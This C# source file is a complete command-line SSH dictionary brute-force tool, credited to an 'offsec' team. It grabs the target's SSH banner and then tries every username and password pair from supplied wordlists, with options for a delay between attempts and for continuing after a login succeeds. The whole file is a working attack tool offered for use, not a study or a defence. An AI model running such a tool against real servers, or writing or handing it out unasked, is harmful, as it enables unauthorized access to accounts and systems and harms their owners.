using System;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using Renci.SshNet;

class Program
{
    static void Main(string[] args)
    {
        if (args.Length < 3)
        {
            Console.WriteLine("Usage: sshBruteForce.exe <target> <usernameFile> <passwordFile> [-delay <seconds>] [-threads <number>] [--continue]");
            return;
        }

        string target = args[0];
        string usernameFile = args[1];
        string passwordFile = args[2];
        int delay = 0;
        int threads = 1;
        bool continueAfterSuccess = false;

        for (int i = 3; i < args.Length; i++)
        {
            if (args[i] == "-delay" && i + 1 < args.Length)
            {
                delay = int.Parse(args[i + 1]);
                i++;
            }
            else if (args[i] == "-threads" && i + 1 < args.Length)
            {
                threads = int.Parse(args[i + 1]);
                i++;
            }
            else if (args[i] == "--continue")
            {
                continueAfterSuccess = true;
            }
            else
            {
                Console.WriteLine("Unknown argument: " + args[i]);
                return;
            }
        }

        Console.WriteLine("\n\tDictionary brute force attack on SSH services");
        Console.WriteLine("\n\tBy Hernan Rodriguez Team offsec Perú");
        Console.WriteLine("\t---------------------------------------------\n");

        Console.WriteLine("\n\tAttempting to retrieve SSH server banner for " + target + "...\n");

        string sshBanner = GetSshBanner(target);
        if (sshBanner != null)
        {
            Console.WriteLine("SSH Server banner: " + sshBanner);
        }
        else
        {
            Console.WriteLine("Failed to grab SSH server banner: Server did not respond with SSH protocol identification.");
            return;
        }

        Console.WriteLine("\n\tBrute forcing passwords for " + target + "...\n");

        bool foundValidCredentials = false;

        using (StreamReader usernameReader = new StreamReader(usernameFile))
        {
            string username;
            while ((username = usernameReader.ReadLine()) != null)
            {
                using (StreamReader passwordReader = new StreamReader(passwordFile))
                {
                    string password;
                    while ((password = passwordReader.ReadLine()) != null)
                    {
                        if (foundValidCredentials && !continueAfterSuccess)
                        {
                            break;
                        }

                        Console.WriteLine("Trying username: " + username.PadRight(15) + " Password: " + password.PadRight(15) + " ... ");

                        if (sshConnection(target, username, password))
                        {
                            Console.ForegroundColor = ConsoleColor.Green;
                            Console.WriteLine("Authentication successful for username: " + username);
                            Console.ResetColor();
                            foundValidCredentials = true;

                            if (!continueAfterSuccess)
                            {
                                return;
                            }
                        }
                        else
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("Failed to authenticate for username: " + username);
                            Console.ResetColor();
                        }

                        if (delay > 0)
                        {
                            System.Threading.Thread.Sleep(1000 * delay);
                        }
                    }
                }
            }
        }

        if (!foundValidCredentials)
        {
            Console.WriteLine("No valid credentials found.");
        }
    }

    static bool sshConnection(string target, string username, string password)
    {
        try
        {
            using (var client = new SshClient(target, username, password))
            {
                client.Connect();
                if (client.IsConnected)
                {
                    client.Disconnect();
                    return true;
                }
            }
        }
        catch (Exception)
        {
            // Failed to authenticate
        }
        return false;
    }

    static string GetSshBanner(string target)
    {
        try
        {
            using (TcpClient client = new TcpClient(target, 22))
            {
                using (NetworkStream stream = client.GetStream())
                {
                    byte[] data = new byte[2024];
                    StringBuilder responseBuilder = new StringBuilder();
                    int bytesRead;
                    while ((bytesRead = stream.Read(data, 0, data.Length)) > 0)
                    {
                        responseBuilder.Append(Encoding.ASCII.GetString(data, 0, bytesRead));
                        if (responseBuilder.ToString().Contains("\n"))
                        {
                            break;
                        }
                    }
                    return responseBuilder.ToString().Trim();
                }
            }
        }
        catch (Exception)
        {
            // Ignore exceptions for banner grabbing
        }
        return null;
    }
}
